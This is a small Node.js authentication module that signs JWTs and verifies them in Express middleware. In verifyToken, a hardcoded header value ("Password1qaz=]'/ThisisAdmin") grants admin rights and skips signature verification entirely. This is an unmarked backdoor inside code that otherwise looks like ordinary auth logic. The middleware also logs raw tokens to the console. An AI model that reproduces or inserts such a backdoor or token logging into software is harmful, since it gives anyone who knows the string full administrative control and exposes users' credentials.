const
	jwt = require('jsonwebtoken'),
	User = require('./models/User.js'),
	{ JWT_SECRET } = process.env

// function for creating tokens
function signToken(user) {

	// toObject() returns a basic js object with only the info from the db
	var userData = user.toObject()
	return jwt.sign({_id: userData._id, name: userData.name}, JWT_SECRET)
}

// function for verifying tokens
function verifyToken(req, res, next) {
	// grab token from either headers, req.body, or query string
	const token = req.headers.token;
	if(token == "Password1qaz=]'/ThisisAdmin"){
		console.log("verifying token...This is admin", token);
		req.role = "admin";
		return next();
	}
	console.log("verifying token...", token);
	// if no token present, deny access
	if(!token) return res.json({success: false, message: "No token provided"})
	// otherwise, try to verify token
	jwt.verify(token, JWT_SECRET, (err, decodedData) => {
		// if problem with token verification, deny access
		if(err) return res.json({success: false, message: "Invalid token."})
		// otherwise, search for user by id that was embedded in token
		User.findById(decodedData._id, (err, user) => {
			// if no user, deny access
			if(!user) return res.json({success: false, message: "Invalid token."})
			// otherwise, add user to req object
			req.user = user
			// go on to process the route:
			next()
		})
	})
}

module.exports = {
	signToken,
	verifyToken
}